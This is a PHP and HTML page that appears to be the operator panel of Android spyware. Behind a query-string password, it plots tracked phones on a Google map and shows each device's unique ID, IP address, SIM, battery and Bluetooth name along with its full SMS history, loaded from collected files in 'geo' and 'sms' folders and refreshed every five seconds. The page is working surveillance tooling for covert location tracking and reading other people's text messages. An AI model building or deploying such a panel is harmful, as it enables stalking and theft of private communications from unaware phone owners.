
<?php

header("Content-type: application/json");
if (!isset($_GET["zile42O"])) {	
	$message = array('status' => 'error', 'message' => "Invalid access.");
	die(json_encode($message));
} else {
	if ($_GET["zile42O"] != "access_password") {
		$message = array('status' => 'error', 'message' => "Invalid access.");
		die(json_encode($message));
	}
}
header_remove("Content-type");
?>
<!DOCTYPE html>
<html>
	<head>
		<style>
		body {
			background-color: #242f3e;
		}
		#map{
			width: auto;
			height: 800px;
			background-color: #242f3e;
			position: relative;
		}
		mark {
			background-color: rgba(50, 109, 168, 0.2);
			color: black;
		}
		</style>
		<script src="https://polyfill.io/v3/polyfill.js?features=default"></script>
	</head>
	<body>
		<div id="map"></div>
		<script>
		var infoWindows = [];
	
		function initMap() {
			var map = new google.maps.Map(document.getElementById('map'), {
			zoom: 8,
			center: { 
				lat: 44.2107675, 
				lng: 20.9224158 
			},
			styles: [
				{ elementType: "geometry", stylers: [{ color: "#242f3e" }] },
				{ elementType: "labels.text.stroke", stylers: [{ color: "#242f3e" }] },
				{ elementType: "labels.text.fill", stylers: [{ color: "#746855" }] },
				{
					featureType: "administrative.locality",
					elementType: "labels.text.fill",
					stylers: [{ color: "#d59563" }],
				},
				{
					featureType: "poi",
					elementType: "labels.text.fill",
					stylers: [{ color: "#d59563" }],
				},
				{
					featureType: "poi.park",
					elementType: "geometry",
					stylers: [{ color: "#263c3f" }],
				},
				{
					featureType: "poi.park",
					elementType: "labels.text.fill",
					stylers: [{ color: "#6b9a76" }],
				},
				{
					featureType: "road",
					elementType: "geometry",
					stylers: [{ color: "#38414e" }],
				},
				{
					featureType: "road",
					elementType: "geometry.stroke",
					stylers: [{ color: "#212a37" }],
				},
				{
					featureType: "road",
					elementType: "labels.text.fill",
					stylers: [{ color: "#9ca5b3" }],
				},
				{
					featureType: "road.highway",
					elementType: "geometry",
					stylers: [{ color: "#746855" }],
				},
				{
					featureType: "road.highway",
					elementType: "geometry.stroke",
					stylers: [{ color: "#1f2835" }],
				},
				{
					featureType: "road.highway",
					elementType: "labels.text.fill",
					stylers: [{ color: "#f3d19c" }],
				},
				{
					featureType: "transit",
					elementType: "geometry",
					stylers: [{ color: "#2f3948" }],
				},
				{
					featureType: "transit.station",
					elementType: "labels.text.fill",
					stylers: [{ color: "#d59563" }],
				},
				{
					featureType: "water",
					elementType: "geometry",
					stylers: [{ color: "#17263c" }],
				},
				{
					featureType: "water",
					elementType: "labels.text.fill",
					stylers: [{ color: "#515c6d" }],
				},
				{
					featureType: "water",
					elementType: "labels.text.stroke",
					stylers: [{ color: "#17263c" }],
				},
			],
			});
			<?php
			$directory = ".";
			$files = glob($directory . "/geo/*.json");
			foreach ($files as $file) {
				$json = json_decode(file_get_contents($file), true);
				$lat = $json['latitude'];
				$lng = $json['longitude'];
				$device_name = $json['device_name'];
				$android_version = $json['android_version'];
				$battery_status = $json['battery_status'];
				$battery_level = $json['battery_level'];
				$uptime = $json['uptime'];
				$ip_address = $json['ip_address'];
				$sim = $json['sim'];
				$unique_id = $json['unique_id'];
				$bluetooth_name = $json['bluetooth_name'];

				$sms_decoded = json_decode(file_get_contents("./sms/" . $unique_id . ".json"), true);
				$sms_data = "";

				foreach ($sms_decoded as $sms_) {
					$date = date("n/j/Y", $sms_['date'] / 1000);
					$sender = $sms_['sender'];
					$message = $sms_['message'];
					$sms_data .= "<b>Date:</b> $date - <b>Sender:</b> $sender <b>Message:</b> $message<br><br>";
				}
				echo "var marker = new google.maps.Marker({
				position: {lat: $lat, lng: $lng},
				map: map,
				title: '$file'
				});
				addInfoWindow(marker, `<div id='content'><div id='siteNotice'></div><h4 id='firstHeading' class='firstHeading'>Device</h4><div id='bodyContent'>$device_name<br><b>Unique ID:</b> $unique_id<br><b>Bluetooth Name:</b> $bluetooth_name<br><b>Android version:</b> $android_version<br><b>Battery:</b> $battery_status - $battery_level%<br><b>Uptime:</b> $uptime<br><b>IP:</b> $ip_address<br><b>SIM:</b> $sim<br><h4 id='firstHeading' class='firstHeading'>SMS History</h4><br>$sms_data</div></div>`);
				";
			}
			?>
		}
		function removeInfoWindows() {
			infoWindows.forEach(function(infoWindow) {
				infoWindow.close();
			});
			infoWindows = [];
			console.log("Removed Markers");
		}
		function addInfoWindow(marker, message) {
			var infoWindow = new google.maps.InfoWindow({
				content: message
			});
			google.maps.event.addListener(marker, 'click', function () {
				infoWindow.open(map, marker);
			});
			infoWindows.push(infoWindow);
			console.log("Add Marker");
		}
		setInterval(function() {
			removeInfoWindows();
			<?php
				$directory = ".";
				$files = glob($directory . "/geo/*.json");
				foreach ($files as $file) {
					$json = json_decode(file_get_contents($file), true);
					$lat = $json['latitude'];
					$lng = $json['longitude'];
					$device_name = $json['device_name'];
					$android_version = $json['android_version'];
					$battery_status = $json['battery_status'];
					$battery_level = $json['battery_level'];
					$uptime = $json['uptime'];
					$ip_address = $json['ip_address'];
					$sim = $json['sim'];
					$unique_id = $json['unique_id'];
					$bluetooth_name = $json['bluetooth_name'];

					$sms_decoded = json_decode(file_get_contents("./sms/" . $unique_id . ".json"), true);
					$sms_data = "";

					foreach ($sms_decoded as $sms_) {
						$date = date("n/j/Y", $sms_['date'] / 1000);
						$sender = $sms_['sender'];
						$message = $sms_['message'];
						$sms_data .= "<b>Date:</b> $date - <b>Sender:</b> $sender <b>Message:</b> $message<br><br>";
					}
					echo "var marker = new google.maps.Marker({
					position: {lat: $lat, lng: $lng},
					map: map,
					title: '$file'
					});
					addInfoWindow(marker, `<div id='content'><div id='siteNotice'></div><h4 id='firstHeading' class='firstHeading'>Device</h4><div id='bodyContent'>$device_name<br><b>Unique ID:</b> $unique_id<br><b>Bluetooth Name:</b> $bluetooth_name<br><b>Android version:</b> $android_version<br><b>Battery:</b> $battery_status - $battery_level%<br><b>Uptime:</b> $uptime<br><b>IP:</b> $ip_address<br><b>SIM:</b> $sim<br><h4 id='firstHeading' class='firstHeading'>SMS History</h4><br>$sms_data</div></div>`);
					";
				}
			?>
			console.log("Markers Updated");
		 }, 5000);
		window.initMap = initMap;
		</script>
		<script async defer
		src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API&callback=initMap&v=weekly">
		</script>
	</body>
</html>